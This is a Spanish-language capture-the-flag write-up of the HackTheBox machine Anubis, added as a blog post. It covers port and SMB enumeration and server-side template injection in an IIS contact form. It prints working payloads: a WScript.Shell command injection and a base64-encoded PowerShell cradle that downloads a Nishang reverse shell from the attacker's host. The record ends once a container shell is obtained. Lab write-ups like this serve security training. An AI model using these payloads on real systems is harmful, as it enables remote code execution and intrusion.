@@ -1,0 +1,215 @@
+---
+title: 'CTF - Anubis WriteUp'
+date: '2022-02-12'
+tags: ["CTF", "Windows", "SSTI", "#Import 2022-12-20 21:06"]
+draft: true
+authors: ['default']
+summary: Esta máquina es diferente al resto Su nivel es Insane y creo que es perfecta para aprender cada det
+---
+
+Esta máquina es diferente al resto. Su nivel es Insane y creo que es perfecta para aprender cada detalle de como progresamos en ella. Tiene además Windows instalado y toca aspectos de contenedores. Vamos a ello.
+
+Iniciamos el proceso validando la comunicación con mediante un Ping donde observamos además su TTL~127 por lo que se deduce que esta Windows ejecutandose en su interior.
+
+Escaneamos los puertos con nmap.
+
+
+```
+nmap -p- --open -sS -T5 -v -n -Pn 10.10.11.102 -oG allPorts
+```
+Tratamos de enumerar las versiones de los puertos que tiene abiertos así como ejecutar varios scripts de reconocimiento básicos de NMAP con el fin de encontrar algún tipo de vulnerabilidad inicial. 
+
+
+```
+nmap -p135,443,445,593,49711 -sCV 10.10.11.102 -oN targeted
+PORT      STATE SERVICE       VERSION
+135/tcp   open  msrpc         Microsoft Windows RPC
+443/tcp   open  ssl/http      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+| ssl-cert: Subject: commonName=www.windcorp.htb
+| Subject Alternative Name: DNS:www.windcorp.htb
+| Not valid before: 2021-05-24T19:44:56
+|_Not valid after:  2031-05-24T19:54:56
+|_http-title: Not Found
+|_ssl-date: 2022-02-12T09:44:48+00:00; +1h00m01s from scanner time.
+|_http-server-header: Microsoft-HTTPAPI/2.0
+| tls-alpn: 
+|_  http/1.1
+445/tcp   open  microsoft-ds?
+593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+49711/tcp open  msrpc         Microsoft Windows RPC
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-security-mode: 
+|   3.1.1: 
+|_    Message signing enabled and required
+| smb2-time: 
+|   date: 2022-02-12T09:44:09
+|_  start_date: N/A
+|_clock-skew: mean: 1h00m00s, deviation: 0s, median: 59m59s
+```
+### SAMBA
+
+Vemos un par de puertos interesantes por donde vamos a empezar a revisar cosas que son el 443 y el 445.  Vamos a empezar con este último, de *smb*, para ver que información de la máquina sacamos rápidamente con Crackmapexec.
+
+
+```
+ crackmapexec smb 10.10.11.102
+SMB         10.10.11.102    445    EARTH            [*] Windows 10.0 Build 17763 x64 (name:EARTH) (domain:windcorp.htb) (signing:True) (SMBv1:False)
+```
+Del comando superior recogemos que estamos ante una máquina con *Win10*, con nombre *EARTH*, perteneciente al dominio *windcorp.htb* y con smb firmado, por lo que no podremos aprovecharnos de vulnerabilidades existentes en aquellos entornos que no requieren firma.
+
+Con el siguiente comando, tratamos de enumerar posibles directorios de red compartidos que sean públicos.
+
+
+```
+❯ smbmap -H 10.10.11.102
+[+] IP: 10.10.11.102:445	Name: www.windcorp.htb
+❯ smbmap -H 10.10.11.102 -u "null"
+[!] Authentication error on 10.10.11.102
+```
+Por último, compruebo utilizando una herramienta alternativa, denominada *smbclient* para intentar por última vez listar recursos compartidos aprovechandonos de un [null session](https://en.wikipedia.org/wiki/Null_session).
+
+
+```
+❯ smbclient -L 10.10.11.102 -N
+Anonymous login successful
+	Sharename       Type      Comment
+	---------       ----      -------
+SMB1 disabled -- no workgroup available
+```
+Poco más podemos hacer por aquí.
+
+IIS
+---
+
+Continuamos con el servidor web con certificado *https.* Conviene apuntarnos en */etc/hosts* el dominio *www.windcorp.htb* y *windcorp.htb* por si estuviésemos ante una máquina con virtual hosting.
+
+Podemos hacer una prueba rápida para verificar esto utilizando CURL con el parámetro *-k* para no tener problemas ante posibles certificados autofirmados.
+
+
+```
+❯ curl -I -X GET https://10.10.11.102 -k
+HTTP/2 404 
+...
+
+❯ curl -I -X GET https://www.windcorp.htb -k
+HTTP/2 200 
+...
+
+```
+..Si tratamos de acceder al servidor directamente con la IP nos arroja un estado HTTP 404 mientras que con el dominio somos capaces de llegar a la página.
+
+![](https://blog.ikerocio.com/content/images/2022/02/image-8.png)Examinamos con *openssl* el certificado de manera más detallada por si arrojase más información relevante.
+
+
+```
+❯ openssl s_client --connect windcorp.htb:443
+CONNECTED(00000003)
+depth=0 CN = www.windcorp.htb
+verify error:num=18:self signed certificate
+verify return:1
+depth=0 CN = www.windcorp.htb
+verify return:1
+---
+Certificate chain
+ 0 s:CN = www.windcorp.htb
+   i:CN = www.windcorp.htb
+
+```
+Volvemos a ver el subdominio *www*. Lanzamos un *whatweb* para ver si llegamos a ver información de interés.
+
+
+```
+❯ whatweb https://www.windcorp.htb
+https://www.windcorp.htb [200 OK] Bootstrap, Country[RESERVED][ZZ], Email[contact@example.com,contact@windcorp.htb], Frame, HTML5, HTTPServer[Microsoft-IIS/10.0], IP[10.10.11.102], Lightbox, Microsoft-IIS[10.0], Script, Title[Windcorp - Index] 
+```
+Vemos que está un [Internet Information Services](https://es.wikipedia.org/wiki/Internet_Information_Services) de Microsoft como servidor por lo que podemos deducir que los tipos de lenguaje que interpreta el servidor estarán relacionados con ASP.NET. Vamos a volver a examinar la página.
+
+Nos encontramos ante un formulario.
+
+![](https://blog.ikerocio.com/content/images/2022/02/image-9.png)Si introducimos información en él y le damos a *Send Message*, nos encontramos la siguiente página.
+
+![](https://blog.ikerocio.com/content/images/2022/02/image-10.png)La información que hemos escrito en la página anterior es exactamente la que visualizamos una vez pulsamos el primer botón. Hay muchas probabilidades de que nos estemos encontrando ante un [Server Side Template Injection](https://portswigger.net/web-security/server-side-template-injection).
+
+Vamos a comprobarlo volviendo a la página anterior, introduciendo unos nuevos valores y volviendo a pulsar el botón.
+
+![](https://blog.ikerocio.com/content/images/2022/02/image-13.png)¿5x5? 😎 Exacto, 25.
+
+![](https://blog.ikerocio.com/content/images/2022/02/image-14.png)Lo que ha sucedido es que hemos conseguido inyectar código y el servidor ha interpretado el resultado. En este caso, el código del servidor no limpia el input del usuario y permite ejecutar directamente en su plantilla lo introducido anteriormente. Esto no es algo único de ASP. Este tipo de vulnerabilidades se pueden dar (y se dan) en cualquier lenguaje que tenga un motor de renderizado de plantillas como puede ser Jinja2 u otros.
+
+Encontramos un modo de ejecutar código desde una shell [aquí](https://www.hackingdream.net/2020/02/reverse-shell-cheat-sheet-for-penetration-testing-oscp.html).
+
+
+```
+%response.write CreateObject("WScript.Shell").Exec("ping 10.10.14.21").StdOut.Readall()%
+
+```
+Pero necesitamos una manera de entablar una reverse shell desde Windows, que no es tan trivial como en Linux con Bash. En el repositorio de Nishang, cogemos [esta](https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1) reverse shell. La idea es cambiar el script de arriba de tal modo que primero nos descarguemos el script a la máquina remota.
+
+
+```
+%response.write CreateObject("WScript.Shell").Exec("cmd /c powershell IEC(New-Object Net.WebClient).downloadString('http://10.10.14.21/PS.ps1')").StdOut.Readall()%
+```
+Siempre que lidiamos con comillas dobles, comillas simples, etc, es mejor encodear el contenido en base64 y tratar de transmitir la información de esa forma. Además, Powershell permite ejecutar código en base64 pasándole el parámetro -e, por lo que vamos a tratar de cambiar primero el comando de arriba un poco. Cosas a tener en consideración según [Microsoft](https://docs.microsoft.com/es-es/powershell/module/microsoft.powershell.core/about/about_character_encoding?view=powershell-7.2).
+
+
+ En general, Windows PowerShell tiene configurada la codificación UNICODE [UTF-16LE](https://wikipedia.org/wiki/UTF-16) de forma predeterminada.
+
+Para ello, ejecutamos el siguiente código.
+
+
+```
+❯ echo "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.21/PS.ps1')"data
+❯ cat data | iconv -t utf-16le | xxd
+00000000: 4900 4500 5800 2800 4e00 6500 7700 2d00  I.E.X.(.N.e.w.-.
+00000010: 4f00 6200 6a00 6500 6300 7400 2000 4e00  O.b.j.e.c.t. .N.
+00000020: 6500 7400 2e00 5700 6500 6200 4300 6c00  e.t...W.e.b.C.l.
+00000030: 6900 6500 6e00 7400 2900 2e00 6400 6f00  i.e.n.t.)...d.o.
+00000040: 7700 6e00 6c00 6f00 6100 6400 5300 7400  w.n.l.o.a.d.S.t.
+00000050: 7200 6900 6e00 6700 2800 2700 6800 7400  r.i.n.g.(.'.h.t.
+00000060: 7400 7000 3a00 2f00 2f00 3100 3000 2e00  t.p.:././.1.0...
+00000070: 3100 3000 2e00 3100 3400 2e00 3200 3100  1.0...1.4...2.1.
+00000080: 2f00 5000 5300 2e00 7000 7300 3100 2700  /.P.S...p.s.1.'.
+00000090: 2900 0a00                                )...
+❯ cat data | iconv -t utf-16le | base64 -w0; echo
+SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADIAMQAvAFAAUwAuAHAAcwAxACcAKQAKAA==
+```
+Básicamente, lo que hacemos cambiando el encoding a utf-16le, es añadir esos puntos entre los caracteres si los visualizamos en formato hexadecimal. Pero a nosotros nos interesa el contenido en base64, por lo que nos quedamos con el último output del mensaje.
+
+Para ello, ponemos un servidor en escucha en nuestra máquina y *netcat* en el 443 (con *rlwrap* para poder usar los cursores en la nueva consola), puesto que se van a realizar las dos cosas al mismo tiempo.
+
+Ponemos el script inferior en el formulario y ejecutamos.
+
+
+```
+%response.write CreateObject("WScript.Shell").Exec("cmd /c powershell -e SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADIAMQAvAFAAUwAuAHAAcwAxACcAKQAKAA==").StdOut.Readall()%
+```
+![](https://blog.ikerocio.com/content/images/2022/02/image-16.png)Ya hemos ganado acceso a la máquina.
+
+Con un par de comandos como ipconfig y ls C: nos damos cuenta de que estamos en un contenedor.
+
+
+```
+❯ ipconfig
+Windows IP Configuration
+Ethernet adapter vEthernet (Ethernet):
+
+   Connection-specific DNS Suffix  . : htb
+   Link-local IPv6 Address . . . . . : fe80::9d2d:a5ec:4bd2:b52d%32
+   IPv4 Address. . . . . . . . . . . : 172.22.47.185
+   Subnet Mask . . . . . . . . . . . : 255.255.240.0
+   Default Gateway . . . . . . . . . : 172.22.32.1
+   
+❯ ls C:\
+    Directory: C:\
+Mode                LastWriteTime         Length Name                         
+----                -------------         ------ ----                         
+d-----        4/25/2021  11:23 PM                inetpub                     
+d-r---        5/24/2021  10:49 PM                Program Files
+d-----         4/9/2021  10:34 PM                Program Files (x86)
+d-r---         4/9/2021  10:37 PM                Users
+d-----        4/26/2021  12:32 AM                Windows
+```
+Podríamos asegurarnos una TTY interactiva utlizando una utilidad de AntonioCoco que tenemos en su repositorio llamada [ConPtyShell](https://github.com/antonioCoco/ConPtyShell) pero como la máquina es larga, vamos a saltarnos este paso.
+
